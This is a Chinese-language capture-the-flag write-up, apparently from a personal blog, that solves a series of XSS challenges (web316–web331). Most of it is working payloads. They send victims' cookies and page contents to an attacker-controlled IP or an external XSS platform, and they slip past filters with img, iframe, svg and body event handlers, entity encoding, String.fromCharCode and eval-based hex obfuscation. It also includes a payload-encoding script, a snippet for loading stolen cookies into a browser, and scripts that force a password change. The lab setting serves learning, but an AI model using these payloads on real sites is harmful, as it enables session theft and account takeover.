<p>1、<strong>跨站脚本攻击（Cross Site Scripting），为不和层叠样式表（Cascading Style Sheets，CSS）的缩写混淆，故将跨站脚本攻击缩写为 XSS。恶意攻击者往 WEB 页面里插入恶意 HTML 代码，当用户浏览该页之时，嵌入其中 Web 里面的 HTML 代码会被执行，从而达到恶意攻击用户的特殊目的。</strong></p>
<p>2、<strong>通过 document.cookie 盗取 cookie中的信息</strong><br><strong>使用 js或 css破坏页面正常的结构与样式</strong><br><strong>流量劫持（通过访问某段具有 window.location.href 定位到其他页面）</strong><br><strong>dos攻击：利用合理的客户端请求来占用过多的服务器资源，从而使合法用户无法得到服务器响应。并且通过携带过程的 cookie信息可以使服务端返回400开头的状态码，从而拒绝合理的请求服务。</strong><br><strong>利用 iframe、frame、XMLHttpRequest或上述 Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作，并且攻击者还可以利用 iframe，frame进一步的进行 CSRF 攻击。</strong><br><strong>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力。</strong></p>
<p>XSS的分类</p>
<p>1、 反射型：<br><strong>一般来说这种类型的XSS，需要攻击者提前构造一个恶意链接，来诱使客户点击，比如这样的一段链接：<a href="http://www.abc.com/?params=`x`" target="_blank" rel="noopener">www.abc.com/?params=`x`</a></strong></p>
<p>2、存储型：<br><strong>这种类型的XSS，危害比前一种大得多。比如一个攻击者在论坛的楼层中包含了一段JavaScript代码，并且服务器没有正确进行过滤输出，那就会造成浏览这个页面的用户执行这段JavaScript代码。</strong></p>
<p>3、DOM型：<br><strong>这种类型则是利用非法输入来闭合对应的html标签。</strong><br><strong>比如，有这样的一个a标签：</strong><br><strong>乍看问题不大，可是当$var的内容变为 ’ οnclick=’alert(/xss/) //，这段代码就会被执行。</strong></p>
</blockquote>
<p><strong>先找一个xs平台来进行中介，<a href="https://gylq.github.io/gylq-navigation" target="_blank" rel="noopener">xss平台导航</a>注册一个号，然后点击创建项目，名字随意，默认模块，随便一个代码</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210806070019689.png" alt="image-20210806070019689"></p>
<p>在输入框提交就可以拿到flag了</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210806070255810.png" alt="image-20210806070255810"></p>
<p><strong>xss平台刷新一下</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210806070405375.png" alt="image-20210806070405375"></p>
<blockquote>
<ul>
<li><strong>但是如果你有服务器就会简单很多，直接在服务器上<code>python -m http.server 39543</code>监听这个端口</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;ip:39543&#x2F;&quot;+document.cookie&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210807134630245.png" alt="image-20210807134630245"></p>
<h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><blockquote>
<ul>
<li>过滤了script，用img代码</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&#39;&#39; onerror&#x3D;location.href&#x3D;&#39;http:&#x2F;&#x2F;118.195.161.220:39543&#x2F;&#39;+document.cookie&gt;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210807135139852.png" alt="image-20210807135139852"></p>
<h2 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h2><blockquote>
<ul>
<li>过滤img，用xss平台的实体十六进制编码</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe WIDTH&#x3D;0 HEIGHT&#x3D;0 srcdoc&#x3D;。。。。。。。。。。&amp;#x3C;&amp;#x73;&amp;#x43;&amp;#x52;&amp;#x69;&amp;#x50;&amp;#x74;&amp;#x20;&amp;#x73;&amp;#x52;&amp;#x43;&#x3D;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x73;&amp;#x3A;&#x2F;&#x2F;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2E;&amp;#x70;&amp;#x74;&#x2F;&amp;#x65;&amp;#x4B;&amp;#x63;&amp;#x5A;&amp;#x22;&amp;#x3E;&amp;#x3C;&#x2F;&amp;#x73;&amp;#x43;&amp;#x72;&amp;#x49;&amp;#x70;&amp;#x54;&amp;#x3E;&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>继续用服务器抓iframe</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe onload&#x3D;document.location&#x3D;&#39;http:&#x2F;&#x2F;118.195.161.220:39543&#x2F;?cookie&#x3D;&#39;+document.cookie&gt;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210807135508552.png" alt="image-20210807135508552"></p>
<h2 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h2><blockquote>
<ul>
<li>iframe继续撸，不过换种写法</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe onload&#x3D;window.open(&#39;http:&#x2F;&#x2F;118.195.161.220:39543&#x2F;?cookie&#x3D;&#39;+document.cookie)&gt;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210807135916013.png" alt="image-20210807135916013"></p>
<h2 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h2><blockquote>
<ul>
<li>过滤了空格可以换%09制表符或者/来代替</li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210806161325778.png" alt="image-20210806161325778"></p>
<p>可以利用String.fromCharCode来进行转换</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;body&#x2F;onload&#x3D;document.write(String.fromCharCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,46,115,98,47,49,66,113,117,62,60,47,115,67,114,73,112,84,62));&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>iframe没过滤继续用，用/来代替空格</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe onload&#x3D;window.open(&#39;http:&#x2F;&#x2F;118.195.161.220:39543&#x2F;?cookie&#x3D;&#39;+document.cookie)&gt;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210807140014892.png" alt="image-20210807140014892"></p>
<h2 id="web321"><a href="#web321" class="headerlink" title="web321"></a>web321</h2><blockquote>
<ul>
<li>过滤了逗号，我换了个10进制实体</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe	WIDTH&#x3D;0	HEIGHT&#x3D;0	srcdoc&#x3D;。。。。。。。。。。&amp;#60;&amp;#115;&amp;#67;&amp;#82;&amp;#105;&amp;#80;&amp;#116;&amp;#32;&amp;#115;&amp;#82;&amp;#67;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#120;&amp;#115;&amp;#46;&amp;#115;&amp;#98;&amp;#47;&amp;#49;&amp;#66;&amp;#113;&amp;#117;&amp;#34;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#67;&amp;#114;&amp;#73;&amp;#112;&amp;#84;&amp;#62;&gt;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210806102726430.png" alt="image-20210806102726430"></p>
<blockquote>
<ul>
<li>或者换一种，用String.fromCharCode拼接<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">document.write(String.fromCharCode(60));document.write(String.fromCharCode(115));document.write(String.fromCharCode(99));document.write(String.fromCharCode(114));document.write(String.fromCharCode(105));document.write(String.fromCharCode(112));document.write(String.fromCharCode(116));document.write(String.fromCharCode(62));document.write(String.fromCharCode(97));document.write(String.fromCharCode(108));document.write(String.fromCharCode(101));document.write(String.fromCharCode(114));document.write(String.fromCharCode(116));document.write(String.fromCharCode(40));document.write(String.fromCharCode(49));document.write(String.fromCharCode(41));document.write(String.fromCharCode(60));document.write(String.fromCharCode(47));document.write(String.fromCharCode(115));document.write(String.fromCharCode(99));document.write(String.fromCharCode(114));document.write(String.fromCharCode(105));document.write(String.fromCharCode(112));document.write(String.fromCharCode(116));document.write(String.fromCharCode(62));</span><br></pre></td></tr></table></figure></div>

<p>写一个脚本跑</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/7</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line">a= <span class="string">"&lt;sCRiPt sRC=//xs.sb/1Bqu&gt;&lt;/sCrIpT&gt;"</span></span><br><span class="line"></span><br><span class="line">res_ord=<span class="string">''</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    tmp = ord(i)</span><br><span class="line">    res_ord = str(tmp)</span><br><span class="line">    payload=<span class="string">"document.write(String.fromCharCode(&#123;&#125;));"</span>.format(res_ord)</span><br><span class="line">    print(payload,end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210806191419032.png" alt="image-20210806191419032"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;body&#x2F;onload&#x3D;document.write(String.fromCharCode(60));document.write(String.fromCharCode(115));document.write(String.fromCharCode(67));document.write(String.fromCharCode(82));document.write(String.fromCharCode(105));document.write(String.fromCharCode(80));document.write(String.fromCharCode(116));document.write(String.fromCharCode(32));document.write(String.fromCharCode(115));document.write(String.fromCharCode(82));document.write(String.fromCharCode(67));document.write(String.fromCharCode(61));document.write(String.fromCharCode(47));document.write(String.fromCharCode(47));document.write(String.fromCharCode(120));document.write(String.fromCharCode(115));document.write(String.fromCharCode(46));document.write(String.fromCharCode(115));document.write(String.fromCharCode(98));document.write(String.fromCharCode(47));document.write(String.fromCharCode(49));document.write(String.fromCharCode(66));document.write(String.fromCharCode(113));document.write(String.fromCharCode(117));document.write(String.fromCharCode(62));document.write(String.fromCharCode(60));document.write(String.fromCharCode(47));document.write(String.fromCharCode(115));document.write(String.fromCharCode(67));document.write(String.fromCharCode(114));document.write(String.fromCharCode(73));document.write(String.fromCharCode(112));document.write(String.fromCharCode(84));document.write(String.fromCharCode(62));&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>服务器payload，继续iframe</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe&#x2F;onload&#x3D;window.open(&#39;http:&#x2F;&#x2F;118.195.161.220:39543&#x2F;?cookie&#x3D;&#39;+document.cookie)&gt;</span><br></pre></td></tr></table></figure></div>

<h2 id="web322"><a href="#web322" class="headerlink" title="web322"></a>web322</h2><blockquote>
<ul>
<li>还是转实体</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe	WIDTH&#x3D;0	HEIGHT&#x3D;0	srcdoc&#x3D;。。。。。。。。。。&amp;#60;&amp;#115;&amp;#67;&amp;#82;&amp;#105;&amp;#80;&amp;#116;&amp;#32;&amp;#115;&amp;#82;&amp;#67;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#120;&amp;#115;&amp;#46;&amp;#115;&amp;#98;&amp;#47;&amp;#49;&amp;#66;&amp;#113;&amp;#117;&amp;#34;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#67;&amp;#114;&amp;#73;&amp;#112;&amp;#84;&amp;#62;&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>或者上面那个方法</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;body&#x2F;onload&#x3D;document.write(String.fromCharCode(60));document.write(String.fromCharCode(115));document.write(String.fromCharCode(67));document.write(String.fromCharCode(82));document.write(String.fromCharCode(105));document.write(String.fromCharCode(80));document.write(String.fromCharCode(116));document.write(String.fromCharCode(32));document.write(String.fromCharCode(115));document.write(String.fromCharCode(82));document.write(String.fromCharCode(67));document.write(String.fromCharCode(61));document.write(String.fromCharCode(47));document.write(String.fromCharCode(47));document.write(String.fromCharCode(120));document.write(String.fromCharCode(115));document.write(String.fromCharCode(46));document.write(String.fromCharCode(115));document.write(String.fromCharCode(98));document.write(String.fromCharCode(47));document.write(String.fromCharCode(49));document.write(String.fromCharCode(66));document.write(String.fromCharCode(113));document.write(String.fromCharCode(117));document.write(String.fromCharCode(62));document.write(String.fromCharCode(60));document.write(String.fromCharCode(47));document.write(String.fromCharCode(115));document.write(String.fromCharCode(67));document.write(String.fromCharCode(114));document.write(String.fromCharCode(73));document.write(String.fromCharCode(112));document.write(String.fromCharCode(84));document.write(String.fromCharCode(62));&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>服务器形式，和上题一样</li>
</ul>
</blockquote>
<h2 id="web323"><a href="#web323" class="headerlink" title="web323"></a>web323</h2><blockquote>
<ul>
<li>过滤iframe</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;body&#x2F;onload&#x3D;document.write(String.fromCharCode(60));document.write(String.fromCharCode(115));document.write(String.fromCharCode(67));document.write(String.fromCharCode(82));document.write(String.fromCharCode(105));document.write(String.fromCharCode(80));document.write(String.fromCharCode(116));document.write(String.fromCharCode(32));document.write(String.fromCharCode(115));document.write(String.fromCharCode(82));document.write(String.fromCharCode(67));document.write(String.fromCharCode(61));document.write(String.fromCharCode(47));document.write(String.fromCharCode(47));document.write(String.fromCharCode(120));document.write(String.fromCharCode(115));document.write(String.fromCharCode(46));document.write(String.fromCharCode(115));document.write(String.fromCharCode(98));document.write(String.fromCharCode(47));document.write(String.fromCharCode(49));document.write(String.fromCharCode(66));document.write(String.fromCharCode(113));document.write(String.fromCharCode(117));document.write(String.fromCharCode(62));document.write(String.fromCharCode(60));document.write(String.fromCharCode(47));document.write(String.fromCharCode(115));document.write(String.fromCharCode(67));document.write(String.fromCharCode(114));document.write(String.fromCharCode(73));document.write(String.fromCharCode(112));document.write(String.fromCharCode(84));document.write(String.fromCharCode(62));&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>过滤了iframe那就换svg</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;window.open(&#39;http:&#x2F;&#x2F;118.195.161.220:39543&#x2F;&#39;+document.cookie)&gt;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210807140735006.png" alt="image-20210807140735006"></p>
<h2 id="web324"><a href="#web324" class="headerlink" title="web324"></a>web324</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;body&#x2F;onload&#x3D;document.write(String.fromCharCode(60));document.write(String.fromCharCode(115));document.write(String.fromCharCode(67));document.write(String.fromCharCode(82));document.write(String.fromCharCode(105));document.write(String.fromCharCode(80));document.write(String.fromCharCode(116));document.write(String.fromCharCode(32));document.write(String.fromCharCode(115));document.write(String.fromCharCode(82));document.write(String.fromCharCode(67));document.write(String.fromCharCode(61));document.write(String.fromCharCode(47));document.write(String.fromCharCode(47));document.write(String.fromCharCode(120));document.write(String.fromCharCode(115));document.write(String.fromCharCode(46));document.write(String.fromCharCode(115));document.write(String.fromCharCode(98));document.write(String.fromCharCode(47));document.write(String.fromCharCode(49));document.write(String.fromCharCode(66));document.write(String.fromCharCode(113));document.write(String.fromCharCode(117));document.write(String.fromCharCode(62));document.write(String.fromCharCode(60));document.write(String.fromCharCode(47));document.write(String.fromCharCode(115));document.write(String.fromCharCode(67));document.write(String.fromCharCode(114));document.write(String.fromCharCode(73));document.write(String.fromCharCode(112));document.write(String.fromCharCode(84));document.write(String.fromCharCode(62));&gt;</span><br></pre></td></tr></table></figure></div>

<p>服务器</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;window.open(&#39;http:&#x2F;&#x2F;118.195.161.220:39543&#x2F;&#39;+document.cookie)&gt;</span><br></pre></td></tr></table></figure></div>



<h2 id="web325"><a href="#web325" class="headerlink" title="web325"></a>web325</h2><p><strong>服务器</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;window.open(&#39;http:&#x2F;&#x2F;118.195.161.220:39543&#x2F;&#39;+document.cookie)&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>好像上个用不了了，那就把转换成native编码或者js转义的base 16进制编码，我写了两种</p>
</blockquote>
<p>js转义的base 16进制编码 <code>注意：简单方法，先转换为URL编码然后文本编辑器替换%为\x</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">eval(&quot;\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x77\x72\x69\x74\x65\x28\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x36\x30\x2C\x31\x31\x35\x2C\x36\x37\x2C\x38\x32\x2C\x31\x30\x35\x2C\x38\x30\x2C\x31\x31\x36\x2C\x33\x32\x2C\x31\x31\x35\x2C\x38\x32\x2C\x36\x37\x2C\x36\x31\x2C\x34\x37\x2C\x34\x37\x2C\x31\x32\x30\x2C\x31\x31\x35\x2C\x34\x36\x2C\x31\x31\x35\x2C\x39\x38\x2C\x34\x37\x2C\x34\x39\x2C\x36\x36\x2C\x31\x31\x33\x2C\x31\x31\x37\x2C\x36\x32\x2C\x36\x30\x2C\x34\x37\x2C\x31\x31\x35\x2C\x36\x37\x2C\x31\x31\x34\x2C\x37\x33\x2C\x31\x31\x32\x2C\x38\x34\x2C\x36\x32\x29\x29\x3B&quot;)</span><br></pre></td></tr></table></figure></div>

<p>还有native编码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">eval(&quot;\u0064\u006F\u0063\u0075\u006D\u0065\u006E\u0074\u002E\u0077\u0072\u0069\u0074\u0065\u0028\u0053\u0074\u0072\u0069\u006E\u0067\u002E\u0066\u0072\u006F\u006D\u0043\u0068\u0061\u0072\u0043\u006F\u0064\u0065\u0028\u0036\u0030\u002C\u0031\u0031\u0035\u002C\u0036\u0037\u002C\u0038\u0032\u002C\u0031\u0030\u0035\u002C\u0038\u0030\u002C\u0031\u0031\u0036\u002C\u0033\u0032\u002C\u0031\u0031\u0035\u002C\u0038\u0032\u002C\u0036\u0037\u002C\u0036\u0031\u002C\u0034\u0037\u002C\u0034\u0037\u002C\u0031\u0032\u0030\u002C\u0031\u0031\u0035\u002C\u0034\u0036\u002C\u0031\u0031\u0035\u002C\u0039\u0038\u002C\u0034\u0037\u002C\u0034\u0039\u002C\u0036\u0036\u002C\u0031\u0031\u0033\u002C\u0031\u0031\u0037\u002C\u0036\u0032\u002C\u0036\u0030\u002C\u0034\u0037\u002C\u0031\u0031\u0035\u002C\u0036\u0037\u002C\u0031\u0031\u0034\u002C\u0037\u0033\u002C\u0031\u0031\u0032\u002C\u0038\u0034\u002C\u0036\u0032\u0029\u0029\u003B&quot;)</span><br></pre></td></tr></table></figure></div>

<p>paylaod</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;body&#x2F;onload&#x3D;eval(&quot;\u0064\u006F\u0063\u0075\u006D\u0065\u006E\u0074\u002E\u0077\u0072\u0069\u0074\u0065\u0028\u0053\u0074\u0072\u0069\u006E\u0067\u002E\u0066\u0072\u006F\u006D\u0043\u0068\u0061\u0072\u0043\u006F\u0064\u0065\u0028\u0036\u0030\u002C\u0031\u0031\u0035\u002C\u0036\u0037\u002C\u0038\u0032\u002C\u0031\u0030\u0035\u002C\u0038\u0030\u002C\u0031\u0031\u0036\u002C\u0033\u0032\u002C\u0031\u0031\u0035\u002C\u0038\u0032\u002C\u0036\u0037\u002C\u0036\u0031\u002C\u0034\u0037\u002C\u0034\u0037\u002C\u0031\u0032\u0030\u002C\u0031\u0031\u0035\u002C\u0034\u0036\u002C\u0031\u0031\u0035\u002C\u0039\u0038\u002C\u0034\u0037\u002C\u0034\u0039\u002C\u0036\u0036\u002C\u0031\u0031\u0033\u002C\u0031\u0031\u0037\u002C\u0036\u0032\u002C\u0036\u0030\u002C\u0034\u0037\u002C\u0031\u0031\u0035\u002C\u0036\u0037\u002C\u0031\u0031\u0034\u002C\u0037\u0033\u002C\u0031\u0031\u0032\u002C\u0038\u0034\u002C\u0036\u0032\u0029\u0029\u003B&quot;)&gt;</span><br></pre></td></tr></table></figure></div>

<h2 id="web326"><a href="#web326" class="headerlink" title="web326"></a>web326</h2><p><strong>服务器</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;window.open(&#39;http:&#x2F;&#x2F;118.195.161.220:39543&#x2F;&#39;+document.cookie)&gt;</span><br></pre></td></tr></table></figure></div>

<p>xss平台</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;body&#x2F;onload&#x3D;eval(&quot;\u0064\u006F\u0063\u0075\u006D\u0065\u006E\u0074\u002E\u0077\u0072\u0069\u0074\u0065\u0028\u0053\u0074\u0072\u0069\u006E\u0067\u002E\u0066\u0072\u006F\u006D\u0043\u0068\u0061\u0072\u0043\u006F\u0064\u0065\u0028\u0036\u0030\u002C\u0031\u0031\u0035\u002C\u0036\u0037\u002C\u0038\u0032\u002C\u0031\u0030\u0035\u002C\u0038\u0030\u002C\u0031\u0031\u0036\u002C\u0033\u0032\u002C\u0031\u0031\u0035\u002C\u0038\u0032\u002C\u0036\u0037\u002C\u0036\u0031\u002C\u0034\u0037\u002C\u0034\u0037\u002C\u0031\u0032\u0030\u002C\u0031\u0031\u0035\u002C\u0034\u0036\u002C\u0031\u0031\u0035\u002C\u0039\u0038\u002C\u0034\u0037\u002C\u0034\u0039\u002C\u0036\u0036\u002C\u0031\u0031\u0033\u002C\u0031\u0031\u0037\u002C\u0036\u0032\u002C\u0036\u0030\u002C\u0034\u0037\u002C\u0031\u0031\u0035\u002C\u0036\u0037\u002C\u0031\u0031\u0034\u002C\u0037\u0033\u002C\u0031\u0031\u0032\u002C\u0038\u0034\u002C\u0036\u0032\u0029\u0029\u003B&quot;)&gt;</span><br></pre></td></tr></table></figure></div>

<h2 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h2><blockquote>
<p>收件人为admin，这次换个写法</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;body onload&#x3D;window.open(&#39;http:&#x2F;&#x2F;118.195.161.220:39543&#x2F;&#39;+document.cookie)&gt;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210807141507613.png" alt="image-20210807141507613"></p>
<h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><blockquote>
<p>继续服务器监听</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#39;http:&#x2F;&#x2F;118.195.161.220:39543&#x2F;&#39;+document.cookie)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>浏览器console一键设置cookie</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">var cookiestr&#x3D;&quot;你的打到的cookie内容&quot;;var arr &#x3D; cookiestr.split(&quot;;&quot;);</span><br><span class="line">for(var i in arr)&#123;</span><br><span class="line"> document.cookie&#x3D;arr[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><blockquote>
<ul>
<li>这次cookie不持久，所以就直接获取页面信息，通过document来获取</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#39;http:&#x2F;&#x2F;118.195.161.220:39543&#x2F;&#39;+document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[1].innerHTML)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></div>

<h2 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h2><blockquote>
<ul>
<li>多了个修改密码功能</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;api&#x2F;change.php?p&#x3D;123456&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></div>

<p>admin 123456登陆</p>
<h2 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h2><blockquote>
<ul>
<li>换成了post请求，用ajax发送请求</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&quot;api&#x2F;change.php&quot;,method:&quot;POST&quot;,data:&#123;&#39;p&#39;:&#39;1234567&#39;&#125;&#125;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></div>

